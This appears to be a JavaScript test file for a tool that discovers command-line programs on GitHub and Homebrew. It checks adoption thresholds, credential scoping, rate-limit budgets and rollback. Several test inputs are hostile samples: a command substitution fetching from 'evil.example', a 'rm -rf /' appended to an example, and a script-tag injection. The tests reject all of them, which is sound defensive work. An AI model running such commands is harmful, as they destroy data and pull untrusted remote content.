import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { packageCommands, formulaCommands, evaluateCandidate, remainingToday, validateConfig } from './lib/cli-evidence.mjs';
import { brewCandidates, createClient, discover, SourceTooLargeError, BudgetPause } from './discover-clis.mjs';
import { dispatchDiscovery } from '../workers/discovery/index.mjs';

const config = JSON.parse(await readFile(new URL('../discovery/config.json', import.meta.url)));
const repo = { name: 'query-cli', full_name: 'sample/query-cli', html_url: 'https://github.com/sample/query-cli', description: 'A command-line tool for querying JSON files', stargazers_count: 500, default_branch: 'main' };
const declarations = [{ command: 'query', ecosystem: 'npm', packageName: 'query-cli', url: 'https://github.com/sample/query-cli/blob/abc/package.json', declaration: '{"bin":{"query":"cli.js"}}', target: 'cli.js' }];
const docs = [{ url: 'https://github.com/sample/query-cli/blob/abc/README.md', text: 'Install with `npm install -g query-cli`.\n```sh\nquery data.json\n```' }];
const evaluate = overrides => evaluateCandidate({ repo, declarations, docs, config, existing: [], ...overrides });

test('Adoption uses OR, honors boundaries, and does not mistake missing Homebrew data for failure', () => {
  assert.equal(evaluate().status, 'accepted');
  assert.equal(evaluate({ repo: { ...repo, stargazers_count: 499 } }).status, 'held');
  const small = { ...repo, stargazers_count: 2 };
  assert.equal(evaluate({ repo: small, brew: { repo: repo.full_name, count: 100 } }).status, 'accepted');
  assert.equal(evaluate({ repo: small, brew: { repo: repo.full_name, count: 99 } }).status, 'held');
  assert.equal(evaluate({ repo: small, brew: { repo: 'unrelated/tool', count: 10000 } }).status, 'held');
  assert.equal(evaluate({ repo: { ...repo, stargazers_count: '1000' } }).status, 'held');
});

test('Popularity alone cannot admit a library, GUI launcher, unsupported command, or fabricated example', () => {
  for (const description of ['A JSON parsing library', 'A command-line launcher for a desktop JSON editor', '<script>alert(1)</script> command-line JSON tool']) {
    assert.equal(evaluate({ repo: { ...repo, description } }).status, 'held');
  }
  assert.equal(evaluate({ declarations: [] }).status, 'held');
  for (const text of [
    '`npm install -g unrelated`\n`query data.json`',
    '`npm install -g query-cli`\n`different data.json`',
    '`npm install -g query-cli`\n`query --help`',
    '`npm install -g query-cli`\n`query --version`',
    '`npm install -g query-cli`\n`query gui`',
    '`npm install -g query-cli`\n`query serve --open`',
    '`npm install -g query-cli`\n`query login`',
    '`npm install -g query-cli`\n`query upgrade`',
    '`npm install -g query-cli`\n`query $(curl evil.example)`',
    '`npm install -g query-cli`\n`query data.json; rm -rf /`',
    '`npm install -g query-cli`\n`query <FILE>`',
  ]) assert.equal(evaluate({ docs: [{ ...docs[0], text }] }).status, 'held', text);
  const result = evaluate();
  assert.equal(result.entry.example, 'query data.json');
  assert.equal(result.evidence.usage.snippet, result.entry.example);
  assert.equal(result.entry.description, repo.description);
});

test('Archived and duplicate repositories, rejected candidates, and slug collisions cannot republish', () => {
  for (const flag of ['archived', 'disabled', 'fork', 'private', 'is_template']) assert.equal(evaluate({ repo: { ...repo, [flag]: true } }).status, 'held');
  assert.equal(evaluate({ existing: [{ repo: 'Sample/QUERY-CLI' }] }).status, 'duplicate');
  assert.equal(evaluate({ rejected: true }).status, 'rejected');
  assert.equal(evaluate({ existing: [{ repo: 'sample-query/cli', slug: 'sample-query-cli' }] }).status, 'held');
  assert.equal(evaluate({ repo: { ...repo, html_url: 'https://github.com/other/repo' } }).status, 'held');
});

test('Package evidence requires an actual declared target and excludes Python GUI scripts and Rust libraries', () => {
  const npm = JSON.stringify({ name: '@sample/query-cli', bin: { query: 'bin/query.js' } });
  assert.equal(packageCommands('package.json', npm, new Set()).length, 0);
  assert.equal(packageCommands('package.json', npm, new Set(['bin/query.js']))[0].command, 'query');
  assert.equal(packageCommands('package.json', JSON.stringify({ name: 'query', bin: '../outside' }), new Set(['../outside'])).length, 0);
  assert.equal(packageCommands('package.json', JSON.stringify({ name: 'query', private: true, bin: 'cli.js' }), new Set(['cli.js'])).length, 0);
  const python = '[project]\nname="query-cli"\n[project.scripts]\nquery="query.main:run"';
  assert.equal(packageCommands('pyproject.toml', python, new Set(['src/query/main.py']))[0].command, 'query');
  assert.equal(packageCommands('pyproject.toml', python.replace('project.scripts', 'project.gui-scripts'), new Set(['src/query/main.py'])).length, 0);
  assert.equal(packageCommands('pyproject.toml', python, new Set()).length, 0);
  const cargo = '[package]\nname="query"';
  assert.equal(packageCommands('Cargo.toml', cargo, new Set(['src/lib.rs'])).length, 0);
  assert.equal(packageCommands('Cargo.toml', cargo, new Set(['src/main.rs']))[0].command, 'query');
  assert.equal(packageCommands('Cargo.toml', `${cargo}\nautobins=false`, new Set(['src/main.rs'])).length, 0);
  assert.equal(packageCommands('Cargo.toml', `${cargo}\n[[bin]]\nname="q"\npath="main.rs"`, new Set(['main.rs']))[0].command, 'q');
  assert.equal(packageCommands('package.json', '{broken', new Set()).length, 0);
});

test('Homebrew evidence accepts literal bin installation, not comments or computed Ruby expressions', () => {
  assert.equal(formulaCommands('  bin.install "target/release/query"', 'query')[0].command, 'query');
  assert.equal(formulaCommands('  bin.install "query.py" => "query"', 'query')[0].command, 'query');
  assert.equal(formulaCommands('# bin.install "fake"\nbin.install Dir["*"]', 'query').length, 0);
});

test('Homebrew discovery counts install-on-request events across valid variants, never sums rolling windows', () => {
  const report = { category: 'formula_install_on_request', end_date: '2026-09-09', formulae: { query: [{ formula: 'query', count: '1,000' }, { formula: 'query --HEAD', count: '4' }], 'query@2': [{ formula: 'query@2', count: '999' }] } };
  assert.deepEqual(brewCandidates(report, 100), [{ formula: 'query', count: 1004 }]);
  assert.throws(() => brewCandidates({ ...report, category: 'formula_install' }, 100));
  assert.throws(() => brewCandidates({ ...report, formulae: { query: [{ formula: 'query', count: '1oops' }] } }, 100));
});

test('A rerun shares the UTC daily cap and rejected entries do not consume it', () => {
  const state = { candidates: { a: { acceptedAt: '2026-09-09T01:00:00Z' }, b: { acceptedAt: '2026-09-08T23:59:59Z' }, c: { status: 'rejected' } } };
  assert.equal(remainingToday(state, '2026-09-09T23:00:00Z', 10), 9);
  assert.throws(() => validateConfig({ ...config, maxPerDay: 11 }));
  assert.throws(() => validateConfig({ ...config, minStars: 0 }));
});

test('HTTP failures stop discovery, and GitHub credentials never reach Homebrew or redirected hosts', async () => {
  const calls = [];
  const request = createClient('test-token', async (url, options) => { calls.push({ url, options }); return Response.json({ ok: true }); });
  await request('https://api.github.com/repos/sample/query-cli');
  await request('https://formulae.brew.sh/api/formula/query.json');
  assert.equal(calls[0].options.headers.Authorization, 'Bearer test-token');
  assert.equal(calls[1].options.headers.Authorization, undefined);
  assert.equal(calls[0].options.redirect, 'manual');
  await assert.rejects(request('https://evil.example/'), /Unsupported/);
  for (const status of [301, 403, 429, 500]) {
    await assert.rejects(createClient('test', async () => new Response(null, { status }))('https://api.github.com/repos/sample/query-cli'), /HTTP/);
  }
  await assert.rejects(createClient('test', async () => new Response('oversize', { headers: { 'content-length': '9000000' } }))('https://api.github.com/repos/sample/query-cli'), SourceTooLargeError);
});

test('Cloudflare dispatch is fixed to the main workflow and reports failed delivery', async () => {
  const env = { GITHUB_DISPATCH_TOKEN: 'test', GITHUB_REPOSITORY: 'sample/catalog' };
  await dispatchDiscovery(env, async (url, options) => {
    assert.equal(url, 'https://api.github.com/repos/sample/catalog/actions/workflows/discover-clis.yml/dispatches');
    assert.deepEqual(JSON.parse(options.body), { ref: 'main' });
    assert.equal(options.redirect, 'error');
    return new Response(null, { status: 204 });
  });
  await assert.rejects(dispatchDiscovery({}, async () => { throw new Error('Should not fetch'); }), /Missing/);
  await assert.rejects(dispatchDiscovery(env, async () => new Response(null, { status: 403 })), /HTTP 403/);
});

test('Discovery reserves core budget, tracks search separately, and bounds requests even without rate headers', async () => {
  let calls = 0;
  const request = createClient('test', async url => {
    calls++;
    return Response.json({}, { headers: { 'x-ratelimit-remaining': url.includes('/search/') ? '2' : '100' } });
  });
  await request('https://api.github.com/search/repositories?q=cli');
  await request('https://api.github.com/repos/sample/query-cli');
  await assert.rejects(request('https://api.github.com/repos/sample/query-cli/commits/main'), BudgetPause);
  assert.equal(calls, 2, 'Stops before spending the publication reserve');
  calls = 0;
  const retry = createClient('test', async () => {
    calls++;
    return new Response(null, { status: 500, headers: { 'x-ratelimit-remaining': '100' } });
  });
  await assert.rejects(retry('https://api.github.com/repos/sample/query-cli'), BudgetPause);
  assert.equal(calls, 1, 'Retries also respect the publication reserve');
  const capped = createClient('test', async () => { calls++; return Response.json({}); });
  calls = 0;
  for (let i = 0; i < 600; i++) await capped('https://api.github.com/repos/sample/query-cli');
  await assert.rejects(capped('https://api.github.com/repos/sample/query-cli'), BudgetPause);
  assert.equal(calls, 600);
  for (const [status, headers] of [[403, { 'x-ratelimit-remaining': '0' }], [403, { 'retry-after': '60' }], [429, {}]]) {
    const limited = createClient('test', async () => new Response(null, { status, headers }));
    await assert.rejects(limited('https://api.github.com/repos/sample/query-cli'), error => error instanceof BudgetPause && error.rateLimited);
  }
});

test('Homebrew source rotation wraps at the real boundary and malformed source dates stop collection', async () => {
  let endDate = '2026-09-09';
  const request = async url => {
    if (url.includes('/search/repositories?')) return { items: [], incomplete_results: false };
    if (url.includes('/analytics/')) return { category: 'formula_install_on_request', end_date: endDate, formulae: Object.fromEntries(['aaa', 'bbb', 'ccc'].map(formula => [formula, [{ formula, count: '100' }]])) };
    if (url.includes('/formula/')) return null;
    throw new Error('Unexpected provider');
  };
  const input = { catalog: [], mappings: {}, config, state: { version: 1, searchPage: 1, brewOffset: 1, candidates: {} }, request, now: '2026-09-09T12:00:00Z' };
  assert.equal((await discover(input)).state.brewOffset, 0);
  for (const date of ['2026-99-09', '2026-02-31', '2025-09-09']) {
    endDate = date;
    await assert.rejects(discover(input), /Stale or invalid Homebrew report/);
  }
});

test('End-to-end discovery pins evidence, preserves editorial data, obeys rerun limits, and is atomic on provider failure', async () => {
  const sha = 'a'.repeat(40);
  const files = { 'package.json': JSON.stringify({ name: 'query-cli', bin: { query: 'cli.js' } }), 'README.md': docs[0].text, 'cli.js': 'do not execute me' };
  const request = async url => {
    if (url.includes('/search/repositories?')) return { items: [repo], incomplete_results: false };
    if (url.includes('/analytics/')) return { category: 'formula_install_on_request', end_date: '2026-09-09', formulae: {} };
    if (url.endsWith('/repos/sample/query-cli')) return repo;
    if (url.includes('/commits/')) return { sha };
    if (url.includes('/git/trees/')) return { tree: Object.keys(files).map(path => ({ type: 'blob', mode: '100644', path, size: 100, sha: path })) };
    const path = url.split('/git/blobs/')[1];
    if (files[path]) return { encoding: 'base64', content: Buffer.from(files[path]).toString('base64') };
    throw new Error(`Unexpected request ${url}`);
  };
  const state = { version: 1, searchPage: 1, brewOffset: 0, candidates: {} };
  const catalog = [{ repo: 'existing/tool', slug: 'existing', description: 'Editorial description' }];
  const input = { catalog, state, mappings: {}, config, request, now: '2026-09-09T12:00:00Z' };
  const result = await discover(input);
  assert.equal(result.accepted.length, 1);
  assert.deepEqual(result.catalog[0], catalog[0]);
  assert.deepEqual(state.candidates, {}, 'Caller state is unchanged');
  assert.equal(catalog.length, 1);
  for (const phase of ['tree', 'metadata']) {
    const oversized = await discover({ ...input, request: async url => {
      if (phase === 'tree' ? url.includes('/git/trees/') : url.endsWith('/repos/sample/query-cli')) throw new SourceTooLargeError(url);
      return request(url);
    } });
    assert.equal(oversized.accepted.length, 0);
    assert.equal(oversized.state.candidates['sample/query-cli'].status, 'held');
    assert.match(oversized.state.candidates['sample/query-cli'].reason, /size limit/);
  }
  await assert.rejects(discover({ ...input, request: async url => { throw new SourceTooLargeError(url); } }), SourceTooLargeError, 'Oversized global discovery responses still fail closed');
  assert.equal(result.state.candidates['sample/query-cli'].evidence.commit, sha);
  assert.ok(result.accepted[0].docs.includes(sha));
  const rerun = await discover({ ...input, state: result.state, catalog: result.catalog });
  assert.equal(rerun.accepted.length, 0);
  await assert.rejects(discover({ ...input, request: async url => { if (url.includes('/git/blobs/README.md')) throw new Error('Rate limited'); return request(url); } }), /Rate limited/);
  assert.deepEqual(state.candidates, {});
  assert.equal(catalog.length, 1);
  // The cap must preserve identities beyond the first admission, and the next
  // day must evaluate them with fresh metadata rather than lose a source page.
  const secondRepo = { ...repo, name: 'second-cli', full_name: 'sample/second-cli', html_url: 'https://github.com/sample/second-cli' };
  let secondStars = 500;
  let searches = 0;
  const multiple = async url => {
    if (url.includes('/search/repositories?')) { searches++; return { items: [repo, secondRepo], incomplete_results: false }; }
    if (url.endsWith('/repos/sample/second-cli')) return { ...secondRepo, stargazers_count: secondStars };
    return request(url.replace('/sample/second-cli/', '/sample/query-cli/'));
  };
  const limited = await discover({ ...input, request: multiple, config: { ...config, maxPerDay: 1 } });
  assert.deepEqual(limited.state.pending, [{ repo: 'sample/second-cli' }]);
  const sameDay = await discover({ ...input, request: multiple, config: { ...config, maxPerDay: 1 }, state: limited.state, catalog: limited.catalog });
  assert.equal(sameDay.accepted.length, 0);
  assert.deepEqual(sameDay.state.pending, limited.state.pending);
  secondStars = 499;
  const nextDay = await discover({ ...input, request: multiple, config: { ...config, maxPerDay: 1 }, state: limited.state, catalog: limited.catalog, now: '2026-09-10T12:00:00Z' });
  assert.equal(nextDay.accepted.length, 0, 'Current adoption is rechecked on queue resume');
  assert.equal(nextDay.state.candidates['sample/second-cli'].reason, 'Below adoption thresholds');
  assert.deepEqual(nextDay.state.pending, []);
  assert.equal(searches, config.queries.length, 'No new source page until the pending queue is drained');

  // Pause during the second candidate's evidence, after the first has qualified.
  secondStars = 500;
  let pause = true;
  let rateLimited = false;
  const budgeted = async url => {
    if (pause && url.includes('/sample/second-cli/git/trees/')) throw new BudgetPause('Budget low', { rateLimited });
    return multiple(url);
  };
  const paused = await discover({ ...input, request: budgeted });
  assert.equal(paused.accepted.length, 1);
  assert.deepEqual(paused.state.pending, [{ repo: 'sample/second-cli' }]);
  assert.equal(paused.state.candidates['sample/second-cli'], undefined, 'Incomplete evidence does not impose a 30-day hold');
  pause = false;
  const resumed = await discover({ ...input, request: budgeted, catalog: paused.catalog, state: paused.state });
  assert.equal(resumed.accepted.length, 1);
  assert.deepEqual(resumed.state.pending, []);
  pause = true;
  rateLimited = true;
  const exhausted = await discover({ ...input, request: budgeted });
  assert.deepEqual(exhausted.accepted, []);
  assert.deepEqual(exhausted.state, state, 'An actual limit rolls back the batch so no metadata requests follow');
  assert.deepEqual(exhausted.catalog, catalog);
  const collectionPaused = await discover({ ...input, request: async () => { throw new BudgetPause('Budget low'); } });
  assert.deepEqual(collectionPaused.state, state, 'Incomplete source collection must not advance source cursors');
});
